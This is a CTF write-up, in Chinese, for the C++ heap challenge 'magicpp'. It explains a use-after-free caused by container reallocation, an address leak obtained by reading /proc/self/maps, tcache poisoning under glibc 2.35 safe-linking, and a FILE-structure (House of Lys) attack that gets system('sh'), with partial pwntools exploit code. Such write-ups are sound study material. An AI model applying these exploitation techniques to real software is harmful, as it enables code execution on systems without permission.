# magicpp

## 题目简述

题目是 C++ 堆题，附件提供 `pwn`、`libc.so.6`，exp 中使用 patched 版本 `magicpp_patched` 调试。功能包括插入、释放、读取文件、展示内容等。

官方提到题目灵感来自 C++ 求值顺序问题：先扩容容器再对旧引用赋值会形成 UAF。源码中类似逻辑如下：

```cpp
struct node *first = &target[0];
first->value = insert_target(&tmp);
```

`insert_target(&tmp)` 可能导致 `target` 扩容并搬迁，`first` 仍指向旧内存，随后写 `first->value` 形成 UAF 写。

## 解题过程

### 关键机制

题目没有直接 leak 功能，但 `load_file` 可以读取任意路径。读取 `/proc/self/maps` 后再 `show`，可得到 libc 基址和 heap 基址。利用阶段结合 glibc 2.35 的 tcache safe-linking，需要将目标地址与 `heap >> 12` 异或。

exp 中的目标计算：

```python
target = (libc.address + 0x21b680) ^ ((heap_base + 0x11eb0) >> 12)
```

随后伪造 IO 结构，走 House of Apple / House of Lys 一类的 FILE 结构利用，最终劫持执行流到 `system("sh")`。

### 求解步骤

先进入程序并读取 maps：

```python
p.sendlineafter('name:', 'aa')
load('/proc/self/maps')
show(1)
```

解析输出，定位 `[heap]` 和 `libc.so.6`：

```python
for _ in range(0x10):
    res = p.recvline()
    if b"heap" in res:
        heap_base = int(res.split(b"-")[0], 16)
    if b"libc.so.6" in res:
        libc.address = int(res.split(b"-")[0], 16)
        break
```

然后通过 UAF 写修改 tcache 链，分配到可控的 libc 关键结构附近，写入伪造的 wide vtable / IO payload：

```python
free(1)
insert(0, str(ord("x")), 0x3c8 - 1, 'a')
free(1)
insert(target, str(ord("x")), 0x10, 'a')

for _ in range(0x18):
    insert(0, "a", 0x10, 'a')

payload = cyclic(0x40) + io.house_of_lys(heap_base + 0x11eb0 + 0x40)
insert(0, "xxx", 0x3c8 - 1, payload)
insert(0, "res", 0x3c8 - 1, p64(heap_base + 0x11eb0 + 0x40))
```

## 方法总结

- 漏洞点：扩容造成旧指针悬挂，随后写旧指针形成 UAF。
- leak 点：`load_file('/proc/self/maps')` 可泄露 heap/libc。
- 利用点：safe-linking 下伪造 tcache fd，结合 glibc IO 结构打 `system("sh")`。
